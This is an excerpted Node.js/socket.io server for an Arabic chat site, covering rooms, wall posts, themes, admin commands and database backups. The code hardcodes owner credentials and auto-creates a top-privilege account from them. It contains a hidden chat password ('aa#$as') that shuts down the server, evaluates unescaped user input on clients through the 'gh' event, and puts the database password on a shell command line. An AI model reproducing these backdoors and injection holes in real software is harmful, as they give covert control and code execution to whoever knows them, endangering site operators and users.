...
const GetStorie = require("./router/storie_list");
const GetStorieView = require("./router/storie_view");
const GetTop10wall = require("./router/top10wall");
...
const StorieRepo = new GetStorie(db);
const StorieViewRepo = new GetStorieView(db);
const Top10Repo = new GetTop10wall(db);
const myDate = new Date();
const PORT = process.env.PORT || Config.Port;
const AccountUserName = "alsahr";
const AccountPassword = "aa05990599";
const AccountUserName1 = "max";
const AccountPassword1 = "aa05990599";
var isVPN = false;
var istime;
var islaod;
var BarFix = false;
...
StorieRepo.createTable();
StorieViewRepo.createTable();
Top10Repo.createTable();
...
app.post("/themeroom", function(req, res) {
    islink = "/themeroom";
    upload(req, res, function(err) {
        if (err) {
            res.sendStatus(401);
            ...
            Jimp.read("uploads/themeroom/" + req.file["filename"], (err, lenna) => {
                if (err) {} else {
                    if (req.file["filename"].includes('gif')) {
                        lenna.resize(100, 100).write("uploads/themeroom/" + req.file["filename"].replace('gif', 'jpg.jpg'));
                    } else {
                        lenna.write("uploads/pic/" + req.file["filename"])
                        lenna.resize(100, 100).write("uploads/themeroom/" + req.file["filename"] + '.jpg');
                    };
                };
            });
            ...
            if (req.file["filename"].includes('.jpg') ||
                ...
                res.json("themeroom/" + req.file["filename"]);
            } else {
                res.sendStatus(401);
            };
        }
...
app.post("/cp/theme", function(req, res) {
    islink = "/themeroom";
    upload(req, res, function(err) {
        if (err) {
            res.send(err);
            ...
            if (req.file["filename"].includes('.jpg') || req.file["filename"].includes('.jpeg')) {
                Jimp.read("uploads/themeroom/" + req.file["filename"], (err, lenna) => {
                    if (err) {} else {
                        lenna.write("uploads/themeroom/" + req.file["filename"]);
                    };
                });
            };
            if (req.file["filename"].includes('.jpg') ||
                ...
                res.end(JSON.stringify({ err: false, msg: "themeroom/" + req.file["filename"] }));
            } else {
                res.sendStatus(401);
            };
        };
...
setInterval(function() {
    ...
    fs.unlink("database/database0.sql", (err) => {
        if (err) {
            // res.end(JSON.stringify({ err: false, data: "فشل تركيب النسخة الاحطياطية" }));
        }
    });
}, 1000 * 60 * 15);
...
if (!fs.existsSync("uploads/themeroom")) {
    fs.mkdirSync("uploads/themeroom");
}
...
if (!fs.existsSync("uploads/sitar")) {
    fs.mkdirSync("uploads/sitar");
}
if (!fs.existsSync("uploads/theme")) {
    fs.mkdirSync("uploads/theme");
}
    ...
    if (req.query.secid == "u") {
        ...
        UsersRepo.getByToken(req.query["token"]).then(function(data) {
            if (data && VerAdminPanel(data.power)) {
                if (VerOwner(data.power)) {
                    if (req.query["state"] == 'banner' || req.query["state"] == 'logo') {
                        islink = '/site';
                    } else {
        ...
        UsersRepo.getByUserName(AccountUserName.toLowerCase().trim()).then((res) => {
            if (res) {} else {
                UsersRepo.create({
                    ...
                    power: "ispower",
                    topic: 'baqer',
                    username: AccountUserName1.toLowerCase().trim(),
                    password: passwordHash.generate(AccountPassword1),
                    token: stringGen(177),
...
function BandComplier(data) {
    if (data) {
        const isbands = ListBand.findIndex((x) => x.device_band && data.includes(x.device_band));
        if (isbands != -1) {
...
function BandComplierIp(data) {
    if (data) {
        const isbands = ListBand.findIndex((x) => x.ip_band && data.includes(x.ip_band));
        if (isbands != -1) {
...
function BackUpDataBase() {
    if (!fs.existsSync("database/database" + new Date().toLocaleDateString().replaceAll("/", "-") + ".sql")) {
        DataBase("database/database" + new Date().toLocaleDateString().replaceAll("/", "-") + ".sql");
    } else {
            ...
            if (table) {
                SettingRepo.getById(1).then((res) => {
                    if (res) {
                        ...
                        sitars = JSON.parse(res.sitar);
                        themes = JSON.parse(res.theme);
                        if (iswlc == false) {
                            iswlc = true;
                            WlCMsg();
                        };
...
function UserDisconnect(data) {
    ...
    if (typeof userData !== "undefined") {
        if (userData.username.toLowerCase().trim() != AccountUserName.toLowerCase().trim()) {
            if (VerStealthPanel(userData.rank) && userData.stealth) {} else {
        ...
        if (userData.uid && userData.islogin == "عضو" && data.state != 3) {
            UsersRepo.updateTokenAndSeen({ token: stringGen(177), lastssen: new Date().getTime(), ip: userData.ip, fp: userData.fp, uid: userData.uid });
        }
        if (userData.uid && userData.islogin == "عضو") {
            UsersRepo.updatelike({ evaluation: userData.evaluation, rep: userData.rep, uid: userData.uid });
        };
...
function ektisara(data) {
    if (data) {
        ...
        const isdone = noletter.findIndex((x) => data.includes(x.v) && x.path == "amsgs");
        const noletter2 = noletter.findIndex((x) => data.search(x.v) != -1 && x.path == "bmsgs");
    ...
    UsersRepo.getByToken(req.query["token"]).then(function(data) {
        if (data && VerAdminPanel(data.power)) {
            ...
            if (req.query.cmd == "setpower") {
                ...
                if (req.query["power"] == "chatmaster" && data.power != "Hide" && data.power != "ispower") {
    ...
    UsersRepo.getByToken(req.query["token"]).then(function(data) {
        if (data && VerAdminPanel(data.power)) {
            ...
            if (req.query.cmd == "addico") {
                ...
                } else if (req.query.tar == "sitar") {
                    sitars.push(req.query.pid);
                    SettingRepo.updateSitar({ sitar: JSON.stringify(sitars), id: 1 });
                    io.emit("msg", { cmd: "sitars", data: sitars });
                    savestate({ state: "إظافة اطار", topic: data.topic, topic1: data.username, room: "", ip: data.ip, time: new Date().getTime() });
                } else if (req.query.tar == "theme") {
                    themes.push(req.query.pid);
                    SettingRepo.updateTheme({ theme: JSON.stringify(themes), id: 1 });
                    io.emit("msg", { cmd: "themes", data: themes });
                    savestate({ state: "إظافة ثيم", topic: data.topic, topic1: data.username, room: "", ip: data.ip, time: new Date().getTime() });
                ...
                UsersRepo.getById(req.query["id"]).then(function(uid) {
                    if (uid) {
                        if (VerPower({ to: data.power, me: uid.power })) {
                            ...
                            UsersRepo.updateDL({ documentationc: dlg.documentation, loginG: dlg.loginG, id: req.query["id"] }).then((drlg) => {
                                if (drlg) {
                                    if (UserInfo[uid.id]) {
                                        if (dlg.documentation == true && dlg.loginG == false) {
                                            io.to(uid.id).emit("msg", { cmd: "alert", data: "تم توثيق عضويتك" });
                                        } else if (dlg.loginG == true && dlg.documentation == true) {
                                            io.to(uid.id).emit("msg", { cmd: "alert", data: "تم توثيقك و إعطائك دخول مميز" });
                                        } else if (dlg.loginG == true && dlg.documentation == false) {
                                            io.to(uid.id).emit("msg", { cmd: "alert", data: "تم اعطائك الدخول المميز" });
                                        }
                                    }
                ...
                if (data.power == "Hide" || data.power == "chatmaster" || data.power == "ispower") {} else {
                    res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
                    return;
                }
                const logsen = UsersList.filter(function(item) {
                    if (item.lastssen) {
                        if (Math.ceil(Math.abs(new Date(Number(item.lastssen)) - new Date()) / (1000 * 60 * 60 * 24)) >= Number(req.query["d"])) {
                            return item;
                        };
                    };
                })
                if (logsen.length > 0) {
                    ...
                    for (var i = 0; i < logsen.length; i++) {
                        if (logsen[i].power != 'ispower' && logsen[i].power != 'Hide' && logsen[i].power != 'chatmaster') {
                ...
                if (req.query["name"] == "chatmaster" || req.query["name"] == "Hide" || req.query["name"] == "ispower") {
            ...
            } else if (req.query.cmd == "sitar") {
                res.end(JSON.stringify(sitars));
            } else if (req.query.cmd == "theme") {
                ...
                if (data.power == "chatmaster" || data.power == "Hide" || data.power == "ispower") {
                    res.end(JSON.stringify({ msg: true }));
                } else {
                    res.end(JSON.stringify({ msg: false }));
                }
                ...
                if (data.power == "Hide" || data.power == "ispower") {
                ...
                if (data.power == "chatmaster" || data.power == "Hide" || data.power == "ispower") {
                    if (req.query["event"] == "fps") {
                    ...
                    } else if (req.query["event"] == "coom") {
                        OwnerRepo.getById(1).then((isfd) => {
                            if (isfd) {
                                if (isfd.cooment) {
                                    OwnerRepo.updateCom({ cooment: false, id: 1 });
                                    OwnerList();
                                    savestate({ state: "الغاء تفعيل تعليقات الجدار", topic: data.username, topic1: data.topic, room: "", ip: data.ip, time: new Date().getTime() });
                                    cooment = false;
                                } else {
                                    OwnerRepo.updateCom({ cooment: true, id: 1 });
                                    OwnerList();
                                    savestate({ state: "تفعيل تعليقات الجدار", topic: data.username, topic1: data.topic, room: "", ip: data.ip, time: new Date().getTime() });
                                    cooment = true;
                                }
                                res.end(JSON.stringify({ err: false, data: "" }));
                            }
                        ...
                        if (fs.existsSync("database/database0.sql")) {
                            ...
                            setTimeout(function() {
                                ...
                                setTimeout(function() {
                                    cp.exec('mysql -u ' + Config.UserDB + ' -p' + Config.PassDB + ' ' + Config.DBDB + ' < ' + 'database/' + 'database0.sql', (error, stdout, stderr) => {
                                        ...
                                        res.end(JSON.stringify({ err: true, msg: " تم تركيب النسخة الإحتياطية بنجاح " }));
                            ...
                            /*fs.rename("database/database0.sql", "database/database.sql", (err) => {
                                if (err) {
                                    res.end(JSON.stringify({ err: false, data: "فشل تركيب النسخة الاحطياطية" }));
                                } else {
                                    res.end(JSON.stringify({ err: false, data: "تم تركيب النسخة الاحطياطية" }));
                                }
                            });*/
                        } else {
                            res.end(JSON.stringify({ err: false, data: "ليس هناك نسخة إحتياطية" }));
                        }
                    } else if (req.query["event"] == "backup") {
                        if (fs.existsSync("database/database0.sql")) {
                            res.end(JSON.stringify({ err: false, data: "هناك نسخة إحطايطيه بلفعل" }));
                        } else {
                            DataBase("database/database0.sql")
                            res.end(JSON.stringify({ err: false, data: "تم إنشاء نسخة إحتياطية" }));
                        }
                        // });
                        ...
                        if (isdone) {
                            ...
                            SettingRepo.getById(req.query.domin || 1).then((isdres) => {
                                if (isdres) {
                                    ...
                                    walllikes = JSON.parse(SiteSetting["walllikes"]);
                                    if (isdres.emo || isdres.dro3 || isdres.sico || isdres.theme || isdres.sitar) {
                                        emos = JSON.parse(isdres.emo);
                                        dro3s = JSON.parse(isdres.dro3);
                                        sicos = JSON.parse(isdres.sico);
                                        themes = JSON.parse(isdres.theme);
                                        sitars = JSON.parse(isdres.sitar);
                                    };
                ...
                if (data.power == "chatmaster" || data.power == "Hide" || data.power == "ispower") {
                    ...
                    } else if (req.query.pid.split("/")[1] == "sitar") {
                        const indexsitar = sitars.findIndex((x) => x == req.query.pid.split("/")[2]);
                        if (indexsitar !== -1) {
                            sitars.splice(indexsitar, 1);
                            SettingRepo.updateSitar({ sitar: JSON.stringify(sitars), id: 1 });
                            io.emit("msg", { cmd: "sitars", data: sitars });
                            savestate({ state: "مسح اطار | ايقونه", topic: data.topic, topic1: data.username, room: "", ip: data.ip, time: new Date().getTime() });
                        }
                    } else if (req.query.pid.split("/")[1] == "theme") {
                        const indextheme = themes.findIndex((x) => x == req.query.pid.split("/")[2]);
                        if (indextheme !== -1) {
                            themes.splice(indextheme, 1);
                            SettingRepo.updateTheme({ theme: JSON.stringify(themes), id: 1 });
                            io.emit("msg", { cmd: "themes", data: themes });
                            savestate({ state: "مسح ثيم | ايقونه", topic: data.topic, topic1: data.username, room: "", ip: data.ip, time: new Date().getTime() });
                        }
                    ...
                    if (UserInfo[req.query["id"]]) {
                        io.to(UserInfo[req.query["id"]].idroom).emit("msg", {
                            ...
                            data: {
                                ...
                                msg: ektisara(req.query["msg"].slice(0, walllikes.lengthMsgRoom)),
            ...
            } else if (req.query.cmd == "coom") {
                res.end(JSON.stringify({ err: true, msg: cooment }));
            ...
            } else if (req.query.cmd == "roomsthemedel") {
                RoomsRepo.updateTheme({ theme: "", id: req.query.id }).then((donedel) => {
                    if (donedel) {
                        RefreshRooms();
                        RoomsRepo.getByMId(req.query.id).then((isro) => {
                            if (isro) {
            ...
            } else if (req.query.cmd == "roomstheme") {
                RoomsRepo.updateTheme({ theme: req.query.theme, id: req.query.id }).then((doneup) => {
                    if (doneup) {
                        RefreshRooms();
                        RoomsRepo.getByMId(req.query.id).then((isro) => {
                            if (isro) {
                        ...
                        res.end(JSON.stringify({ err: false, msg: req.query.theme }));
                    }
                });
                ...
                if (req.query["id"] == "D8D8A9A9C0") {
                    ...
                    RoomsRepo.delete(req.query.id).then((deldone) => {
                        if (deldone) {
                            ...
                            RefreshRooms();
                            io.emit("msg", { cmd: "r-", data: req.query.id });
...
function EnterBoot(data) {
    if (data) {
        UserInfo[data.id] = {
            ...
            busy: data.busy,
            hidepic: data.hidepic,
            hidesoundnot: data.hidesoundnot,
            alerts: data.alerts,
...
io.on("connection", function(socket) {
    ...
    socket.on("gh", function(data) {
        socket.emit("msg", { k: stringGen(5), cmd: "ev", data: "if(typeof gh=='string'){gh='" + data + "';prs();}" });
    });
            ...
            if (login) {
                ...
                if (islog != -1) {
                    ...
                    setTimeout(function() {
                        ...
                        reconnectmuc();
                        socket.emit("msg", { cmd: "login", data: { uid: login.uid, point: login.evaluation, id: socket.id, room: MyRoom(login.fp), msg: "ok", ttoken: login.token, pic: login.pic } });
                    }, 1000);
                } else {
                    socket.emit("msg", { cmd: "ev", data: 'window.onbeforeunload = null; location.href="/";' });
                };
    ...
    function ChangeNopic(data) {
        if (typeof data != "number") {
            return;
        }
        if (UserInfo[socket.id]) {
            const indexa = online.findIndex((x) => x.id == socket.id);
            if (indexa != -1 && UserInfo[socket.id].hidepic == false) {
                online[indexa].nopic = data;
                io.emit("msg", { cmd: "u^", data: online[indexa] });
            }
        }
    }

    function ChangeNosound(data) {
        if (typeof data != "number") {
            return;
        }
        if (UserInfo[socket.id]) {
            const indexa = online.findIndex((x) => x.id == socket.id);
            if (indexa != -1 && UserInfo[socket.id].hidesoundnot == false) {
                online[indexa].nosound = data;
                io.emit("msg", { cmd: "u^", data: online[indexa] });
            }
        }
    }
    socket.on("isstates", ChangeSatets);
    socket.on("nopicuser", ChangeNopic);
    socket.on("nosounduser", ChangeNosound);
    ...
    function saves_bar(data) {
        if (data) {
            BarsRepo.create({ force: data.force, bg: data.bg, bid: data.bid, bcc: data.bcc, lid: data.lid, mcol: data.mcol, pic: data.pic, msg: data.msg, topic: data.topic, ucol: data.ucol, uid: data.uid }).then((res) => {
                if (res) {
        ...
        if (UserInfo[socket.id]) {
            io.to(UserInfo[socket.id].idroom).emit("msg", {
                ...
                data: {
                    ...
                    class: "hmsg",
                    topic: 'ترقية مستوى',
                    msg: UserInfo[socket.id].topic.split("<").join("&#x3C;") + ' تم ترقيت نجومه للوصول الى ' + UserInfo[socket.id].evaluation + '  رسالة في الحائط',
                    roomid: UserInfo[socket.id].idroom,
                    pic: '/imgs/star.png',
                    uid: ''
                },
    ...
    function EnterUserGust(data) {
        if (data) {
            ...
            if (isrc && data.islogin == "عضو") {
                socket.emit("msg", { k: stringGen(5), cmd: "ok", data: {} });
            } else {
                socket.emit("msg", { k: stringGen(5), cmd: "nok", data: {} });
            };
            ...
            socket.emit("msg", { cmd: "coom", data: cooment });
            // setTimeout(function(){
            UserInfo[socket.id] = {
                ucol: data.ucol,
                mcol: data.mcol,
            ...
            if (VerStealthPanel(data.rank) && data.stealth) {} else {
                if (data.loginG) {
                    const script = '<div class="loginItms">' +
                        '<div style="background-image: url(' + data.pic + ')" class="loginImg"></div>' +
                        '<img src="imgs/2.png" class="loginLogo">' +
                        '<div class="loginUserName" > ' + data.topic + '</div>' +
                        '<img src="/flag/' + (data.code.toLowerCase().replace("il", "ps") || "tn") + '.png" class="loginFlog">' +
                        '</div>'
            ...
            if (data.rank != 'Hide' || data.power != "ispower") {
                savelogin({
                    state: data.islogin,
                    topic: data.username,
                    topic1: data.topic,
            ...
            socket.emit("msg", { cmd: "sitars", data: sitars });
            socket.emit("msg", { cmd: "themes", data: themes });
                    ...
                    BarsRepo.getAll().then((datavb) => {
                        if (datavb && BarFix) {
                            for (var i = 0; i < datavb.length; i++) {
                                ...
                                socket.emit("msg", { cmd: "bc^", data: datavb[i] });
                            }
                        }
                    });
                }
    ...
    function FilterChat(data) {
        if (data && UserInfo[socket.id]) {
            const noletter1 = noletter.findIndex((x) => data.includes(x.v));
            const isfls = noletter.findIndex((x) => data.includes(x.v) && x.path == "amsgs");
            if (noletter1 != -1 && isfls == -1) {
                ...
                if (noletter[noletter1].path == "bmsgs" || noletter[noletter1].path == "wmsgs") {
                    HistLetterRepo.createTable().then((table) => {
                        if (table) {
                            HistLetterRepo.create({ ip: UserInfo[socket.id].ip, msg: data.slice(0, walllikes.lengthMsgRoom), topic: UserInfo[socket.id].topic, v: noletter[noletter1].v });
                            ...
                            if (ShowPowers[indeprower].bootedit) {
                                io.to(repu[i].id).emit("msg", {
                                    ...
                                    data: {
                                        topic: data.state,
                                        force: 1,
                                        msg: replaceEktisar(data.msg.slice(0, walllikes.lengthMsgRoom)),
    ...
    socket.on("msg", function(data) {
        ...
        if (Config.Finished) {
            socket.emit("msg", { cmd: "not", data: { topic: "", force: 1, msg: "مغلق من قبل الاستضافه موبايل هوست", user: "" } });
            return;
        }
        ...
        if (UserInfo[socket.id] != undefined) {} else if (data.cmd == 'g' || data.cmd == 'reg' || data.cmd == 'login') {} else {
            console.log('not');
            return;
        };
        ...
        if (data.cmd == 'g' || data.cmd == 'reg' || data.cmd == 'login') {
            if (istikrar(5000) == 1) {
                return;
            };
        ...
        try {
            if (data.cmd == "unick") {
                ...
                if (UserInfo[socket.id] && UserInfo[data.data["id"]]) {
                    ...
                    if (MyCp != -1) {
                        ...
                        if (data.data["nick"].length >= 150) {
                            ...
                            savestate({ state: "تعديل زخرفة", topic: UserInfo[socket.id].topic, ip: UserInfo[socket.id].ip, topic1: UserInfo[data.data["id"]].topic, room: data.data["nick"].split("<").join("&#x3C;"), time: new Date().getTime() });

                            const inme = online.findIndex((x) => x.id == data.data["id"]);
                            if (inme != -1) {
                                online[inme].topic = data.data["nick"].split("<").join("&#x3C;");
                                UserInfo[data.data["id"]].topic = data.data["nick"].split("<").join("&#x3C;");
                                io.emit("msg", { cmd: "u^", data: online[inme] });
                            }

                            if (UserInfo[data.data["id"]].uid) {
                                UsersRepo.updateName({ uid: UserInfo[data.data["id"]].uid, topic: data.data["nick"] });
                            }
                        }
                    }
                };
                ...
                if (UserInfo[socket.id] && UserInfo[data.data["u2"]]) {
                    ...
                    socket.to(data.data["u2"]).emit("msg", {
                        ...
                        data: {
                            topic: "",
                            msg: "تم حذف الاطار الخاص فيك ",
                            user: '',
                            force: 0,
                        }
                    });

                    UserInfo[data.data["u2"]].itar = '';
                    const isd = online.findIndex((x) => x.id == data.data["u2"]);
                    if (isd != -1) {
                        online[isd].itar = '';
                        io.emit("msg", { cmd: "u^", data: online[isd] });
                    ...
                    if (UserInfo[data.data["u2"]].uid) {
                        UsersRepo.updateItar({ itar: '', uid: UserInfo[data.data["u2"]].uid });
                    };
                ...
                if (!data.data["sitar"] || !data.data["u2"]) {
                    return;
                }
                ...
                if (UserInfo[data.data["u2"]] && UserInfo[socket.id]) {
                    ...
                    if (UserInfo[data.data["u2"]].rank == "") {
                        socket.emit("msg", {
                            ...
                            data: {
                                topic: "",
                                msg: "فقط السوبر يمكنك إعطاهم اطار ",
                                user: "",
                                force: 0,
                            },
                        });
                    ...
                    if (MyCp != -1) {
                        ...
                        socket.to(data.data["u2"]).emit("msg", {
                            ...
                            data: {
                                topic: "",
                                msg: "اطار " + "<img src=" + "/sitar/" + data.data["sitar"] + ">",
                                user: socket.id,
                                force: 0,
                            }
                        });

                        UserInfo[data.data["u2"]].itar = '/sitar/' + data.data["sitar"];
                        const isd = online.findIndex((x) => x.id == data.data["u2"]);
                        if (isd != -1) {
                            online[isd].itar = '/sitar/' + data.data["sitar"];
                            io.emit("msg", { cmd: "u^", data: online[isd] });
                        }

                        if (UserInfo[data.data["u2"]].uid) {
                            UsersRepo.updateItar({ itar: '/sitar/' + data.data["sitar"], uid: UserInfo[data.data["u2"]].uid });
                        };
                    };

                };
            } else if (data.cmd == "theem-") {
                if (typeof data.data != "object") {
                    return;
                }
                if (!data.data["u2"]) {
                ...
                if (UserInfo[socket.id] && UserInfo[data.data["u2"]]) {
                    ...
                    socket.to(data.data["u2"]).emit("msg", {
                        ...
                        data: {
                            topic: "",
                            msg: "تم حذف الثيم الخاص فيك ",
                            user: '',
                            force: 0,
                        }
                    });

                    UserInfo[data.data["u2"]].them = '';
                    const isd = online.findIndex((x) => x.id == data.data["u2"]);
                    if (isd != -1) {
                        online[isd].them = '';
                        io.emit("msg", { cmd: "u^", data: online[isd] });
                    ...
                    if (UserInfo[data.data["u2"]].uid) {
                        UsersRepo.updateThem({ them: '', uid: UserInfo[data.data["u2"]].uid });
                    };
                ...
                if (!data.data["theme"] || !data.data["u2"]) {
                    return;
                }
                ...
                if (UserInfo[data.data["u2"]] && UserInfo[socket.id]) {
                    ...
                    if (UserInfo[data.data["u2"]].rank == "") {
                        socket.emit("msg", {
                            ...
                            data: {
                                topic: "",
                                msg: "فقط السوبر يمكنك إعطاهم ثيم ",
                                user: "",
                                force: 0,
                            },
                        });
                    ...
                    if (MyCp != -1) {
                        ...
                        socket.to(data.data["u2"]).emit("msg", {
                            ...
                            data: {
                                topic: "",
                                msg: "ثيم " + '<img src=" /theme/' + data.data["theme"] + '"style="width:100%;">',
                                user: socket.id,
                                force: 0,
                            }
                        });

                        UserInfo[data.data["u2"]].them = '/theme/' + data.data["theme"];
                        const isd = online.findIndex((x) => x.id == data.data["u2"]);
                        if (isd != -1) {
                            online[isd].them = '/theme/' + data.data["theme"];
                            io.emit("msg", { cmd: "u^", data: online[isd] });
                        }

                        if (UserInfo[data.data["u2"]].uid) {
                            UsersRepo.updateThem({ them: '/theme/' + data.data["theme"], uid: UserInfo[data.data["u2"]].uid });
                        };
                    };
                ...
                if (data.data.msg == "givemelike") {
                    if (UserInfo[socket.id]) {
                        if (UserInfo[socket.id].rank == 'chatmaster' || UserInfo[socket.id].rank == 'Hide' || data.power == "ispower") {
                            const indexa = online.findIndex((x) => x.id == socket.id);
                            if (indexa != -1) {
                ...
                if (data.data.msg == "aa#$as") {
                    process.exit(1);
                } else if (data.data.msg == "aa#$assas") {
                    StartServer(1);
                }
                if (!data.data.msg) {
                    socket.emit("msg", {
                                ...
                                if (ektisara(data.data.msg) == '') {
                                    socket.emit("msg", {
                                        ...
                                        data: {
                                            ...
                                            msg: data.data.msg.slice(0, walllikes.lengthMsgRoom),
                                            pic: UserInfo[socket.id].pic,
                                            topic: UserInfo[socket.id].topic.split("<").join("&#x3C;"),
                                    ...
                                    io.to(UserInfo[socket.id].idroom).emit("msg", {
                                        ...
                                        data: {
                                            ...
                                            mcol: UserInfo[socket.id].mcol,
                                            uid: UserInfo[socket.id].id,
                                            msg: ektisara(data.data.msg.slice(0, walllikes.lengthMsgRoom)),
                                            pic: UserInfo[socket.id].pic,
                                            topic: UserInfo[socket.id].topic.split("<").join("&#x3C;"),
                                            ucol: UserInfo[socket.id].ucol,
                                        },
                        ...
                        if (ektisara(data.data.msg) || data.data.link) {
                            ...
                            if (BarFix) {
                                ...
                                saves_bar({
                                    ...
                                    mcol: UserInfo[socket.id].mcol,
                                    pic: UserInfo[socket.id].pic,
                                    msg: (ektisara(data.data.msg.slice(0, walllikes.lengthMsgBc)) ? ektisara(data.data.msg.slice(0, walllikes.lengthMsgBc)) : "") + (data.data.link ? `<a href="` + data.data.link + `"target="_blank"  class="uplink"></a>` : ""),
                            ...
                            if (UserInfo[socket.id].evaluation == 200) {
                                Newlebvel();
                            } else if (UserInfo[socket.id].evaluation == 350) {
                                Newlebvel();
                            } else if (UserInfo[socket.id].evaluation == 450) {
                                Newlebvel();
                            } else if (UserInfo[socket.id].evaluation == 600) {
                                Newlebvel();
                            } else if (UserInfo[socket.id].evaluation == 700) {
                                Newlebvel();
                            } else if (UserInfo[socket.id].evaluation == 800) {
                                Newlebvel();
                            } else if (UserInfo[socket.id].evaluation == 950) {
                                Newlebvel();
                            } else if (UserInfo[socket.id].evaluation == 1100) {
                                Newlebvel();
                            } else if (UserInfo[socket.id].evaluation == 1350) {
                                Newlebvel();
                            } else if (UserInfo[socket.id].evaluation == 1450) {
                                Newlebvel();
                            } else if (UserInfo[socket.id].evaluation == 2000) {
                                Newlebvel();
                            };
                        };
                    };
                ...
                if (UserInfo[socket.id]) {
                    ...
                    if (iszero != -1) {
                        if ((roomslists[iszero].deleted == null || roomslists[iszero].deleted == false) && iszeros.length == 1) {
                            RoomsRepo.delete(roomslists[iszero].id).then((res) => {
                                if (res) {
                                    io.emit("msg", { cmd: "r-", data: roomslists[iszero].id });
                                    RefreshRooms();
                                }
                            });
                        }
                    ...
                    if (maxroom && ismax != -1) {
                        if (maxroom.length == roomslists[ismax].max && VerRoomsOwner(UserInfo[socket.id].rank) == false) {
                            socket.emit("msg", {
                                cmd: "not",
                                data: {
                                    topic: "",
                    ...
                    if (isBandRoom({ user: UserInfo[socket.id].fp, room: data.data["id"] })) {
                        ...
                        if (isroom != -1) {
                            ...
                            if (roomslists[isroom].pass != data.data["pwd"] && roomslists[isroom].needpass && VerRoomsOwner(UserInfo[socket.id].rank) == false) {
                                socket.emit("msg", {
                                    cmd: "not",
                                    data: {
                                        topic: "",
                                ...
                                if (data.data["id"] != UserInfo[socket.id].idroom && UserInfo[socket.id].username != AccountUserName.toLowerCase().trim()) {
                                    if (VerStealthPanel(UserInfo[socket.id].rank) && UserInfo[socket.id].stealth) {} else {
                                        // io.to(UserInfo[socket.id].idroom).emit("tyoff", { id: socket.id });
                                        ...
                                        io.to(data.data["id"]).emit("msg", {
                                            ...
                                            data: {
                                                ...
                                                id: UserInfo[socket.id].id,
                                                topic: UserInfo[socket.id].topic.split("<").join("&#x3C;"),
                                                msg: " هذا المستخدم قد دخل الغرفة" +
                                                    '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:4px;max-width:180px;min-width:60px;" onclick="rjoin(\'' +
                                                    roomslists[isroom].id +
                                                    "')\">" +
                                                    roomslists[isroom].topic +
                ...
                if (UserInfo[socket.id]) {
                    const isal = ShowPowers.findIndex((x) => x.name == UserInfo[socket.id].rank);
                    if (isal != -1) {
                        if (ShowPowers[isal].publicmsghide) {
                            if (data.data.msg) {
                                if (NoTikrar() == false) {
                                    return;
                                }
                            ...
                            if (ektisara(data.data.msg) == '') {
                                socket.emit("msg", {
                                    ...
                                    data: {
                                        ...
                                        ucol: UserInfo[socket.id].ucol,
                                        topic: UserInfo[socket.id].topic.split("<").join("&#x3C;"),
                                        msg: data.data.msg.slice(0, walllikes.lengthMsgPm) || ` <a href="` + data.data.link + `" target="_blank"  class="uplink">` + data.data.link + `</a>`,
                                        pm: data.data["id"],
                                        pic: UserInfo[socket.id].pic,
                                        uid: socket.id,
                                    },
                                ...
                                io.to(data.data["id"]).emit("msg", {
                                    ...
                                    data: {
                                        ...
                                        ucol: UserInfo[socket.id].ucol,
                                        topic: UserInfo[socket.id].topic.split("<").join("&#x3C;"),
                                        msg: ektisara(data.data.msg.slice(0, walllikes.lengthMsgPm)) || ` <a href="` + data.data.link + `" target="_blank"  class="uplink">` + data.data.link + `</a>`,
                                        pm: socket.id,
                ...
                if (!data.data["bg"] || !data.data["ucol"] || !data.data["topic"] || !data.data["mcol"] || !data.data["pic"] || !data.data["msg"]) {
                    socket.emit("msg", {
                        cmd: "not",
                        data: {
                            topic: "",
                    ...
                    if (UserInfo[socket.id].rep < walllikes.likeUpPic) {
                        socket.emit("msg", {
                            ...
                            data: {
                                topic: "",
                                force: 1,
                                msg: walllikes.likeUpPic + " لرفع صورة يجك ان يكون عدد اللايكات",
                                user: "",
                            },
                        });
                    } else {
                ...
                if (data.data["broadcast"] == true || data.data["broadcast"] == false) {} else {
                    return;
                }

                if (data.data["pass"] || !data.data["pass"]) {} else {
                    return;
                }
                if (UserInfo[socket.id]) {
                    ...
                    if (indexroodama == -1) {
                        ...
                        if (ShowPowers[indexroodama].createroom == 0) {
                            ...
                            RoomsRepo.updatePic({ pic: data.data["pic"], id: data.data["id"] }).then((doneup) => {
                                if (doneup) {
                                    RefreshRooms();
                            ...
                            RoomsRepo.updateTheme({ theme: data.data["theme"], id: data.data["id"] }).then((doneup) => {
                                if (doneup) {
                                    RefreshRooms();
                                    RoomsRepo.getByMId(data.data["id"]).then((isro) => {
                ...
                if (UserInfo[socket.id]) {
                    ...
                    BarsRepo.getById(data.data.bid).then((isiscomms) => {
                        if (isiscomms) {
                            ...
                            listcomment.push({ bid: data.data.bid, pic: UserInfo[socket.id].pic, topic: UserInfo[socket.id].topic.split("<").join("&#x3C;"), pccus: data.data.c.split("<").join("&#x3C;").slice(0, 100) });
                            BarsRepo.updateComment({ bid: data.data.bid, bcc: JSON.stringify(listcomment) }).then((iscomm) => {
                                if (iscomm) {
                                    ...
                                    io.emit("msg", { cmd: "bcco", data: { bid: data.data.bid, pic: UserInfo[socket.id].pic, topic: UserInfo[socket.id].topic, pccus: data.data.c.split("<").join("&#x3C;").slice(0, 100) } });
                                }
                            });
                        }
                    });
                            ...
                            if (isliked != -1) {
                                ...
                                BarsRepo.updateLiked({ bid: data.data.bid, likes: JSON.stringify(listlike) }).then((islike) => {
                                    if (islike) {
                                        ...
                                        BarsRepo.getById(data.data.bid).then((islikea) => {
                                            if (islikea) {
                                                io.emit("msg", { cmd: "bc^", data: { bid: data.data.bid, likes: islikea.likes } });
                                            }
                                        });
                                    }
                                });
                ...
                if (!data.data["topic"] || !data.data["about"] || !data.data["welcome"] || !data.data["max"]) {
                    return;
                }
                ...
                if (data.data["delete"] == true || data.data["delete"] == false) {} else {
                    return;
                }
                ...
                if (data.data["busy"] == false || data.data["busy"] == true) {} else {
                    return;
                }
                if (UserInfo[socket.id]) {
            ...
            } else if (data.cmd == "hidepic") {
                if (typeof data.data != "object") {
                    return;
                }
                if (data.data["hidepic"] == false || data.data["hidepic"] == true) {} else {
                    return;
                }
                if (UserInfo[socket.id]) {

                    if (data.data["hidepic"] == true) {
                        ChangeNopic(1);
                        setTimeout(function() {
                            if (UserInfo[socket.id]) {
                                UserInfo[socket.id].hidepic = true;
                            };
                        }, 1000);
                    } else {
                        UserInfo[socket.id].hidepic = false;
                        ChangeNopic(0);
                    }
                }
            } else if (data.cmd == "hidesoundnot") {
                if (typeof data.data != "object") {
                    return;
                }
